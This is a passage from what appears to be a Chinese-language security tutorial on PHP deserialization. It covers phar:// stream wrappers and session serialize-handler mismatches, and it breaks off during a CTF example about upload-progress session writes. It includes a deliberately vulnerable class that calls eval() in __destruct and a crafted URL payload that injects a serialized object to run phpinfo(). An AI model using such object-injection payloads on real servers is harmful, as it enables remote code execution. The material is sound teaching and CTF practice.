<p><strong>我们通常会省略掉 file:// 协议，因为这是 PHP 使用的默认值。</strong></p>
<p>这两段介绍来源于<a target="_blank" rel="noopener" href="https://laravelacademy.org/post/7459.html%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E8%AF%B4%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%E5%91%A2%EF%BC%9F%E8%AF%B4%E6%98%8E%E6%88%91%E4%BB%ACPHP">https://laravelacademy.org/post/7459.html，那么这个说明了一个什么问题呢？说明我们PHP</a> 目前的几乎所有的 I/O 操作都是通过流配合流包装器来实现的，<strong>因为 PHP 默认的包装器就是 file://</strong> ，虽然你没写，但是底层 PHP 还是通过流包装器实现的。</p>
<p><strong>还有更多</strong></p>
<p>使用 <strong>stream_get_wrappers()</strong> 获取当前系统注册的全部 wrapper</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624171722589.png" alt="image-20230624171722589"></p>
<h4 id="3-开始向下挖掘">3. 开始向下挖掘</h4>
<p>我们上面说了，phar 文件中存在我们可控的序列化的内容，然后我们又说，这个内容在 文件系统函数 配合 phar:// 的时候能实现反序列化，但是我们没说为什么，这也就是我们这节讨论的重点，所有的原因都能从源代码找到答案</p>
<p><strong>(1)先看一下 Phar 文件源代码部分</strong></p>
<p>因为 Phar 是 PHP 的一个扩展，于是我们在 GitHub 的 php-src/ext/phar/phar.c 去全局搜索 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">unserailize()</a> 函数</p>
<p><strong>如图所示：</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624171836907.png" alt="image-20230624171836907"></p>
<p><strong>(2)但是这个函数为什么能调用呢</strong></p>
<p>这就涉及到了文件系统函数的部分了，我们找一下源码，位置在 Github php-src/ext/standard/file.c<br>
这个文件包含了非常多的文件函数的实现，我们先全局搜索 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L519">file_get_contents</a></p>
<p><strong>如图所示：</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624171935674.png" alt="image-20230624171935674"></p>
<p>然后我们稍微往下翻翻就能发现和<a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L550">处理 wrapper 流相关的函数</a></p>
<p><strong>如图所示：</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624172000090.png" alt="image-20230624172000090"></p>
<p>我们发现了这个 php)stream_open_wrapper_ex 这个函数能处理我们的 wrapper ，那么其他的类似的函数是不是也是底层调用了这个函数呢？</p>
<p><strong>(3)由此及彼</strong></p>
<p>我们全局搜索一下 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L871">fopen()</a>，然后我们看一下具体的实现</p>
<p><strong>如图所示：</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624172153661.png" alt="image-20230624172153661"></p>
<p>是不是很熟悉？这下好了，我们不如把 PHP 源码下载下来，来一个真正的全局搜索</p>
<p><strong>(4)举一反三</strong></p>
<p>我本地使用 sublime text 对整个 PHP 源码进行了扫描，发现了很多很多地方调用了这个函数，其实并不只是我们常见的 文件系统函数</p>
<p><strong>如图所示：</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624172259036.png" alt="image-20230624172259036"></p>
<p>好家伙，太底层了，看不懂了，日后拜读</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#4-phar-%E7%9A%84%E5%AE%9E%E6%88%98">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#4-phar-的实战</a></p>
<h2 id="0x12-php-session反序列化">0x12 php-session反序列化</h2>
<h3 id="121-session简单介绍">12.1 session简单介绍</h3>
<p>​		在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。当第一次访问网站时，**seesion_start()**函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
<pre><code class="hljs plaintext">官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。主要有以下特点：

session保存的位置是在服务器端
session通常是要配合cookie使用

因为HTTP的无状态性，服务端产生了session来标识当前的用户状态
本质上，session就是一种可以维持服务器端的数据存储技术。即**session技术就是一种基于后端有别于数据库的临时存储数据的技术**</code></pre>
<h3 id="122-session-的存储机制">12.2 session 的存储机制</h3>
<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<br>
session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的<br>
session_start();运行之后开启session并且产生一个唯一的32位的session_id</p>
<h3 id="123-session文件创建的几个tip">12.3 session文件创建的几个tip</h3>
<p>1.代码中有session_start(),会自动创建session文件。</p>
<p>2.如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session（也就创建了session文件），不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>3.session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。</p>
<pre><code class="hljs plaintext">比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入session文件里。</code></pre>
<p>注意：如果默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空。这时我们就要利用竞争，在session文件内容清空前进行包含利用。</p>
<h3 id="124-php-session工作流程">12.4 PHP session工作流程</h3>
<p>以PHP为例，理解<code>session</code>的原理</p>
<pre><code class="hljs plaintext">1. PHP脚本使用 session_start()时开启`session`会话，会自动检测`PHPSESSID`
   - 如果`Cookie`中存在，获取`PHPSESSID`
   - 如果`Cookie`中不存在，创建一个`PHPSESSID`，并通过响应头以`Cookie`形式保存到浏览器
   
2. 初始化超全局变量`$_SESSION`为一个空数组

3. PHP通过`PHPSESSID`去指定位置（`PHPSESSID`文件存储位置）匹配对应的文件
   - 存在该文件：读取文件内容（通过反序列化方式），将数据存储到`$_SESSION`中
   - 不存在该文件： session_start()创建一个`PHPSESSID`命名文件
   
4. 程序执行结束，将`$_SESSION`中保存的所有数据序列化存储到`PHPSESSID`对应的文件中</code></pre>
<p>具体原理图：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626175143920.png" alt="image-20230626175143920"></p>
<h3 id="125-phpini中一些session配置">12.5 php.ini中一些session配置</h3>
<pre><code>session.save_handler=“”		–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start boolen	–指定会话模块是否在请求开始时启动一个会话默认为0不启动
session.save_path="/tmp"      --设置session文件的存储位置
session.auto_start= 0          --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动
session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php  
session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用
session.upload_progress.cleanup= On --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用
</code></pre>
<h3 id="126-不同的引擎来处理session文件">12.6 不同的引擎来处理session文件</h3>
<h4 id="1-php处理器">1. php处理器</h4>
<p>首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果，代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'session'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626180100412.png" alt="image-20230626180100412"></p>
<p>php处理器存储格式</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$_SESSION[‘name’]的键名：name</td>
<td style="text-align:center">|</td>
<td style="text-align:center">s:7:“xianzhi”;</td>
</tr>
</tbody>
</table>
<h4 id="2-php_binary处理器">2. php_binary处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_binary</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_binary'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'sessionsessionsessionsessionsession'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-meta">?&gt;</span></code></pre>
<p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为<code>#</code>，所以最终的结果如下图所示：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626180229200.png" alt="image-20230626180229200"></p>
<table>
<thead>
<tr>
<th style="text-align:center">键名的长度对应的 ASCII 字符</th>
<th style="text-align:center">键名</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值.</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">sessionsessionsessionsessionsession</td>
<td style="text-align:center">s:7:“xianzhi”;</td>
</tr>
</tbody>
</table>
<h4 id="3-php_serialize-处理器">3. php_serialize 处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_serialize</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_serialize'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'session'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626180345266.png" alt="image-20230626180345266"></p>
<p>序列化的结果为：<code>a:1:{s:7:"session";s:7:"xianzhi";}</code></p>
<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
<h4 id="4-session的反序列化漏洞利用">4. session的反序列化漏洞利用</h4>
<p>session的反序列化漏洞，就是利用<code>php</code>处理器和<code>php_serialize</code>处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</p>
<p>php引擎的存储格式是<code>键名|serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。如果程序使用两个引擎来分别处理的话就会出现问题</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'aaa'</span>] = <span class="hljs-string">'bbb'</span>;
<span class="hljs-comment">//aaa|s:3:"bbb";</span>
<span class="hljs-comment">//该引擎使用的是php，会把'|'看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对'|'后的值进行反序列化处理。</span></code></pre>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_serialize'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'aaa'</span>] = <span class="hljs-string">'bbb'</span>;
<span class="hljs-comment">//a:1:{s:3:"aaa";s:3:"bbb";}</span>
<span class="hljs-comment">//php_serialize引擎只会把'|'当做一个正常的字符。</span></code></pre>
<p>具体示例分析：</p>
<p>首先创建<code>session.php</code>，使用<code>php_serialize</code>处理器来存储session数据</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_serialize'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'session'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-meta">?&gt;</span></code></pre>
<p><code>test.php</code>，使用默认<code>php</code>处理器来存储session数据</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">f4ke</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Who are you?"</span>;
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
      <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);
    }
}
<span class="hljs-variable">$str</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">f4ke</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>接着，我们构建URL进行访问<code>session.php</code>：</p>
<pre><code class="hljs http">http://www.session-serialize.com/session.php?session=|O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626182515714.png" alt="image-20230626182515714"></p>
<p>打开<code>PHPSESSID</code>文件可看到序列化存储的内容</p>
<pre><code class="hljs php">a:<span class="hljs-number">1</span>:{s:<span class="hljs-number">7</span>:<span class="hljs-string">"session"</span>;s:<span class="hljs-number">45</span>:<span class="hljs-string">"|O:4:"</span>f4ke<span class="hljs-string">":1:{s:4:"</span>name<span class="hljs-string">";s:10:"</span><span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-string">";}</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626182740031.png" alt="image-20230626182740031"></p>
<p>漏洞分析：</p>
<blockquote>
<p>在<code>session.php</code>程序执行，我们将<code>|O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}</code>通过<code>php_serialize</code>处理器序列化保存成<code>PHPSESSID</code>文件；</p>
<p>由于浏览器中保存的<code>PHPSESSID</code>文件名不变，当我们访问<code>test.php</code>，<code>session_start();</code>找到<code>PHPSESSID</code>文件并使用<code>php</code>处理器反序列化文件内容，识别格式即</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">a:1:{s:7:“session”;s:45:"</td>
<td style="text-align:center">|</td>
<td style="text-align:center">O:4:“f4ke”:1:{s:4:“name”;s:10:“phpinfo();”;}</td>
</tr>
</tbody>
</table>
<p>php处理器会以|作为分隔符，将<code>O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}</code>反序列化，就会触发<code>__wakeup()</code>方法，最后对象销毁执行<code>__destruct()</code>方法中的<code>eval()</code>函数，相当于执行如下：</p>
<pre><code class="hljs plaintext">$_SESSION['session'] = new f4ke();
$_SESSION['session']-&gt;name = 'phpinfo();';</code></pre>
</blockquote>
<p>我们访问<code>test.php</code>，即可直接执行<code>phpinfo()</code>函数</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626182845552.png" alt="image-20230626182845552"></p>
<p><strong>CTF例题：PHPINFO</strong></p>
<p>找不到原题，先跟着做一遍</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//A webshell is wait for you</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>, <span class="hljs-string">'php'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;mdzz = <span class="hljs-string">'phpinfo();'</span>;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;mdzz);
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'phpinfo'</span>]))
{
    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'index.php'</span>));
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>我们可以看到<code>ini_set('session.serialize_handler', 'php')</code>，判断可能存在session反序列化漏洞，根据代码逻辑，访问URL加上<code>phpinfo</code>参数新建对象触发魔术方法执行<code>phpinfo()</code>函数，进一步查看<code>session.serialize_handler</code>配置</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626183308867.png" alt="image-20230626183308867"></p>
<p>可见<code>php.ini</code>中<code>session.serialize_handler = php_serialize</code>，当前目录中被设置为<code>session.serialize_handler = php</code>，因此存在session反序列化利用的条件</p>
<p>补充知识</p>
<pre><code class="hljs plaintext">phpinfo文件中

local value(局部变量：作用于当前目录程序，会覆盖master value内容):php
master value(主变量：php.ini里面的内容):php_serialize</code></pre>
<p>那么我们如何找到代码入口将利用代码写入到<code>session</code>文件？想要写入<code>session</code>文件就得想办法在<code>$_SESSION</code>变量中增加我们可控的输入点</p>
<p>补充知识</p>
<pre><code class="hljs plaintext">Session 上传进度(此特性自 PHP 5.4.0 后可用)

当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时可以发送一个POST请求到终端（例如通过XHR）来检查这个状态

当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。</code></pre>
<p>翻译成人话就是，当检测Session 上传进度这一特性是开启状态时，我们可以在客户端写一个文件上传的功能，文件上传的同时，<code>POST</code>一个与<code>php.ini</code>中设置的<code>session.upload_progress.name</code>同名变量<code>PHP_SESSION_UPLOAD_PROGRESS</code>，如下图，即可写入<code>$_SESSION</code>，进一步序列化写入<code>session</code>文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626183628792.png" alt="image-20230626183628792"></p>
<p>下面是官方给出的一个文件上传时监测进度例子:</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"upload.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"&lt;?php echo ini_get("</span><span class="hljs-attr">session.upload_progress.name</span>"); ?&gt;</span>" value="123" /&gt;
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file1"</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file2"</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre>
<p>其中<code>name=""</code>也可以设置为<code>name="PHP_SESSION_UPLOAD_PROGRESS"</code></p>
<p>在session中存储的上传进度，如下所示:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">"upload_progress_123"</span>] = <span class="hljs-keyword">array</span>(
 <span class="hljs-string">"start_time"</span> =&gt; <span class="hljs-number">1234567890</span>,   <span class="hljs-comment">// The request time  请求时间</span>
 <span class="hljs-string">"content_length"</span> =&gt; <span class="hljs-number">57343257</span>, <span class="hljs-comment">// POST content length 长度</span>
 <span class="hljs-string">"bytes_processed"</span> =&gt; <span class="hljs-number">453489</span>,  <span class="hljs-comment">// Amount of bytes received and processed 已接收字节</span>
 <span class="hljs-string">"done"</span> =&gt; <span class="hljs-literal">false</span>,              <span class="hljs-comment">// true when the POST handler has finished, successfully or not 是否上传完成</span>
 <span class="hljs-string">"files"</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-comment">//上传的文件</span>
  <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(
   <span class="hljs-string">"field_name"</span> =&gt; <span class="hljs-string">"file1"</span>,       <span class="hljs-comment">// Name of the &lt;input/&gt; field  input中设定的变量名</span>
   <span class="hljs-comment">// The following 3 elements equals those in $_FILES             </span>
   <span class="hljs-string">"name"</span> =&gt; <span class="hljs-string">"foo.avi"</span>,           <span class="hljs-comment">//文件名</span>
   <span class="hljs-string">"tmp_name"</span> =&gt; <span class="hljs-string">"/tmp/phpxxxxxx"</span>,
   <span class="hljs-string">"error"</span> =&gt; <span class="hljs-number">0</span>,
   <span class="hljs-string">"done"</span> =&gt; <span class="hljs-literal">true</span>,                <span class="hljs-comment">// True when the POST handler has finished handling this file</span>
   <span class="hljs-string">"start_time"</span> =&gt; <span class="hljs-number">1234567890</span>,    <span class="hljs-comment">// When this file has started to be processed</span>
